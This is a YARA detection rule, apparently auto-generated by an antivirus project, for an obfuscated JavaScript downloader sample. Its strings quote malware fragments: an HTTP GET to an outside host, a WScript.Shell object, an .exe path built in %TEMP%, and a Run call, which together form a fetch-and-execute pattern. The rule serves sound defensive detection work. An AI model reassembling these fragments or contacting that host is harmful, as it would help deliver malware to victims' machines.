rule sig_20160330_08cfb9c36ec93fc63fa50d35680bce91 {
  meta:
    description = "datamaliciousorder - file 20160330_08cfb9c36ec93fc63fa50d35680bce91.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "62d010550e7a3a48b6707021b9b0beb3e3fbe62edfb7729270ccb5ab81c512ad"

  strings:
    $s1  = "_TT[_F0](\"GET\", \"http://assura-courtage.org/j2osla\", false);" fullword ascii
    $s2  = "function _Z(_O0, _WR){_U = _U * 1; return _O0 - _WR;};" fullword ascii
    $s3  = "var _HL = function _SK() {return WScript[_M](\"WScript\"+\".Shell\");}(), _LM = 11;" fullword ascii
    $s4  = "if (_TT[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _TZ(){return _C + \"\";};" fullword ascii
    $s6  = "function _EN() {return _HL[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"MAmzT9uIewtU.ex\" + \"e\";};" fullword ascii
    $s7  = "function _ZO() {return ((_QY == true) && (_QY == _AC)) ? 1 : _U;};" fullword ascii
    $s8  = "function _Q(_PJ){_HL[\"Run\"](_PJ, _U, _U);};" fullword ascii
    $s9  = "function _JO()" fullword ascii
    $s10 = "function _F(_J) {var _O = (1, 2, 3, 4, 5, _J); return _O;};" fullword ascii
    $s11 = "function _CF(){return 22;};" fullword ascii
    $s12 = "function _FT(){return _M;};" fullword ascii
    $s13 = "var _V = new this[\"Date\"]();" fullword ascii
    $s14 = "return _Z(_JY, _K);" fullword ascii
    $s15 = " while (_P){" fullword ascii
    $s16 = "var _AF = false;" fullword ascii
    $s17 = "_AC = true; " fullword ascii
    $s18 = "_QY = true; " fullword ascii
    $s19 = "var _QY = false;" fullword ascii
    $s20 = "var _AC = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}